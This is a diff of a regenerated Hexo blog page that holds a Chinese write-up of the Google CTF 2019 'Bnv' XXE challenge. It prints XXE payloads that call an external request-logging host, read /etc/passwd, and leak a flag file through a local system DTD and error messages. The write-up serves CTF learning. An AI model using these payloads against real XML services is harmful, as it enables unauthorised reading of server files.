@@ -55,7 +55,7 @@ xxe题，做的很少。
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -530,12 +530,12 @@ xxe题，做的很少。
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/XXE/">
@@ -577,7 +577,7 @@ xxe题，做的很少。
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    482
+                    487
                 </div>
                 
 
@@ -602,18 +602,18 @@ xxe题，做的很少。
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820171713352.png"></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820171713352.png"></p>
 <p>xxe题，做的很少。</p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212013565.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212013565.png"></p>
 <p>某个师傅曾言</p>
 <blockquote>
 <p>有json的地方就可能有xxe</p>
 </blockquote>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212256827.png"></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212310901.png"></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212332230.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212256827.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212310901.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212332230.png"></p>
 <p>这样提示需要声明元素message</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214800081.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214800081.png"></p>
 <p>声明下实体</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE message [
@@ -622,12 +622,12 @@ xxe题，做的很少。
 ]&gt;
 &lt;message&gt;&amp;b;&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214714839.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214714839.png"></p>
 <p>请求成功。</p>
 <p>接下来利用<a target="_blank" rel="noopener" href="https://beeceptor.com/">https://beeceptor.com/</a></p>
 <p>这个网站可以创建个临时域名并保存对该域名的请求日志</p>
 <p>尝试加载外部实体</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>
     &lt;!ENTITY % remote-dtd SYSTEM "https://asdfasd.free.beeceptor.com/">
@@ -636,9 +636,9 @@ xxe题，做的很少。
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可惜加载失败</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215223474.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215223474.png"></p>
 <p>尝试加载内部文件</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>
     &lt;!ENTITY % remote-dtd SYSTEM "/etc/passwd">
@@ -646,25 +646,25 @@ xxe题，做的很少。
 </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215437263.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215437263.png"></p>
 <blockquote>
 <p>error detected in Markup declaration</p>
 <p>在标记声明中检测到错误。</p>
 </blockquote>
 <p>说明已经被加载了，但不是个格式正确的xml文件所以中断了。</p>
-<p>加载/flag，报错一致，说明/flag文件存在，接下来就是考虑如何读取。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221036776.png"></p>
+<p>加载&#x2F;flag，报错一致，说明&#x2F;flag文件存在，接下来就是考虑如何读取。</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221036776.png"></p>
 <blockquote>
 <p>It works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.</p>
 <p>这能正常工作是因为xml实体都是常数，如果定义了两个实体为同一个名字，则只有第一个实体会被使用。</p>
 </blockquote>
 <p>而在题目中，读取了一个错误的实体，会返回完整的实体名。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221415864.png"></p>
-<p>假设第一次读取**/flag<strong>实体，第二次把</strong>/flag的里的值<strong>当做实体来读取，明显</strong>/flag的里的值**这个实体不存在，然后就会报错返回，这样就拿到flag了。</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221415864.png"></p>
+<p>假设第一次读取**&#x2F;flag<strong>实体，第二次把</strong>&#x2F;flag的里的值<strong>当做实体来读取，明显</strong>&#x2F;flag的里的值**这个实体不存在，然后就会报错返回，这样就拿到flag了。</p>
 <p>利用系统自带的dtd文件。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221838853.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221838853.png"></p>
 <p>payload</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span><span class="token punctuation">[</span><span class="token internal-subset">
     &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
     &lt;!ENTITY % ISOamso '
@@ -740,12 +740,12 @@ xxe题，做的很少。
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/XXE/">
@@ -1099,12 +1099,12 @@ xxe题，做的很少。
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -1156,12 +1156,12 @@ xxe题，做的很少。
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
